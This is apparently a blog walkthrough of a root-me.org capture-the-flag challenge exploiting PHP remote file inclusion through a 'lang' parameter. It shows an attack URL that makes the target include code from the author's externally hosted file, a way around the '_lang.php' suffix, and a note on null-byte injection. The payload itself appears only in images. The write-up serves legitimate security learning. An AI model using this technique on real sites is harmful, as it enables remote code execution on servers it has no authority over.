
##### Challenge Description 

Get the PHP source code.


Hello! Today we will learn about RFI from a challenge from [root-me.org](https://www.root-me.org/?page=news&lang=fr). If you wish to understand about RFI and LFI in theory, you can look it up on my [post](https://joshuanatan.medium.com/remote-file-inclusion-local-file-inclusion-rfi-lfi-c5911c0a1a5a) before. I do believe it will help you to understand. Now, let’s begin!

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*c7_pZHPweLGCDs3tKgFL9g.png)

Challenge Information

## Information Gathering

Now we will get any information regarding the challenge. The goal is to read the PHP source code for this page.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*A1AH7_7nbzYK28yRff6sRQ.png)

View of the Application in English Version

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*dw-2QPoar5SIIiJbRM6nMw.png)

View of the Application in French Version

We can see that the content dynamically changes between languages. I try to look deeper. I try to put a random string.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*v4gXnfUcbt1GiZ_Xq4FxIQ.png)

Illegal Input

We get other information. The includes part must be like

```
$lang = $_GET["lang"]; //en  
include($lang."_lang.php"); //include en_lang.php

```

Because of that, we know that the developer does not set its absolute path which is vulnerable to RFI.

For now, I think this is enough to go into the strategy part.

## Strategy

We know that this is vulnerable to RFI. Because our target is not in the internal network but in the public instead, we need a webserver that can be publicly accessible in order to exploit the vulnerability. The idea is to make our target’s server include our malicious code from our web server. That is why we need a publicly accessible web server in order to exploit the vulnerability.

In this case, I will be using free hosting provided by Github Pages.

So the idea is, we will put a full path to my site on the “lang” URL parameter. for example,

http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit

where https://h4ckrati.github.io/rfi-test/exploit is the URL of my web server and the _myexploit.php_ is the payload which contains that :



Now talking about the payload, our goal is to get the PHP source code. This can be done in at least 2 ways:

1. We use the “[system](https://www.php.net/manual/en/function.system.php)” function in PHP to execute shell commands like “cat index.php” to show the content of the index.php.
2. We can also use the PHP built-in function like the “[highlight_file](https://www.php.net/manual/en/function.highlight-file.php)” function or the “[show_source](https://www.php.net/manual/en/function.show-source.php)” function.

Another thing to be considered, we know that the include function has a trailing string, the “_lang.php”. This also must be bypassed otherwise we can not load the correct file. There are 2 ways that I know to bypass it:

1. Make the exploit file has a trailing “_lang.php” string, for example, myexploit_lang.php. So when you call the file, you can call them like this, http://challenge01.root-me.org/web-serveur/ch13/?lang=[https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit. So when this link is used, it will be like, include(“[https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit_lang.php”);
2. We use null byte injection, hence we can control the file we want to include. The request will be like [https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit.php%00. But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.

So that is our strategy blueprint, now we will execute them.

## The Execution

Keep in mind, all documentation that I wrote here is the result of many and many trials and errors. So please do not consider yourself dumb or something just because you can not guess it in the first place. I did all the trials and errors for about 4 hours. 90% of my time was used to understand the concept of RFI, so it’s okay.

### The Malicious Code

Since this is the core of the attack, we will focus on this one first. Back to the strategy, we will create a file called “myexploit_lang.php”. Because we are forced to use the .php extension, we face a problem. The problem is, every time this file is requested/called, all the PHP code will be executed on our server first. What we intend is we can pass the malicious code to our target’s server and have them executed there, not here (here means in our server).

So the idea to overcome the problem is, instead of writing the malicious PHP code as the executable, I write our exploit code in a string and “echo” the string so the string that contains PHP code will be sent back to the target’s server and will be executed on the target’s server.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*DgxVD3wZ6GNzp8J50z3KPw.png)

Proof of Concept

Using this way, we will know what is the server name that executes this code.

![](https://miro.medium.com/v2/resize:fit:1382/1*okK0t3n1EmB7XdaZzxgdJg.png)

The Result

By this proof, we know that we have exploited the RFI vulnerability, why? Because we can force our target’s server to execute a code from an external place, which in this case our server. This means that I can actually control what code a server can execute.

If you still do not get why this is dangerous, imagine this. When you build a website, all the necessary files must be put in the server right? The server itself is protected by a password (like if you are using Cpanel). Now imagine, I can force your website to execute code that is not controlled by you because it does not sit in your server but in mine instead. So basically, your website is executing code that is prepared by somebody else that you do not know.

Now let’s finish the challenge. We just replace the PHP command as we have planned before to force the challenge to show its source code. Below is the result [and of course, no flag spoiled :)].

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*eynlNzqIXtQNY0Hbzd3Sxw.png)

## Closing

Congratulations! you have tried to exploit RFI, and I really hope it encourages you to learn more. I think this is really interesting especially when you finally understand how RFI exploitation works. I wrote a deep explanation of RFI and LFI in this [post](https://joshuanatan.medium.com/remote-file-inclusion-local-file-inclusion-rfi-lfi-c5911c0a1a5a). Using this post, you will understand deeper about RFI and LFI exploitation.